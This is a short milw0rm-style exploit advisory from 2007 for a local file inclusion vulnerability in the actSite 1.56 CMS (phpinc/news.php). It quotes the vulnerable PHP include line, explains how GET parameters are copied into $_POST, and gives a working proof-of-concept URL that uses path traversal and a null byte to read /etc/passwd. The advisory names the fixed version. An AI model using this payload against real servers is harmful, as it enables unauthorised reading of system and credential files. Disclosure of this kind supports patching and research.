<html><head><title>actSite 1.56 (news.php) Local File Inclusion Vulnerability</title></head><pre>                         \#'#/

                         (-.-)

   -----------------oOO---(_)---OOo-----------------

   | actSite v1.56 (news.php) Local File Inclusion |

   |                 coded by DNX                  |

   -------------------------------------------------

[!] Discovered: DNX

[!] Vendor: http://www.actsite.de

[!] Detected: 02.09.2007

[!] Reported: 02.09.2007

[!] Remote: yes



[!] Background: actSite is a content management system based on PHP and MySQL



[!] Bug: in phpinc/news.php line 101



         require PHP_INCLUDE_PATH.&quot;/inc/news/news_$_POST[do].php&quot;;



[!] PoC: 

    - http://[site]/[path]/phpinc/news.php?do=/../../../../../../../etc/passwd%00



[!] Description:

    - So why we can inject code in a post variable per url? Let's do some research...

      - In phpinc/news.php line 36

      	require_once('../config.php');



      - Let's take a look in 'config.php' line 22

        if(empty($BaseCfg['install_run'])) require_once($BaseCfg['BaseDir'].&quot;/phpinc/inc/csb.php&quot;);



      - Ok, let's take a look in 'phpinc/inc/csb.php' line 18

        if(getenv('REQUEST_METHOD') == &quot;GET&quot;) {

		foreach($_GET as $key =&gt; $val) {

			 $_POST[$key] =&amp; $_GET[$key];

		}

	}



[!] Solution: Install security update to v1.57

# milw0rm.com [2007-10-01]</pre></html>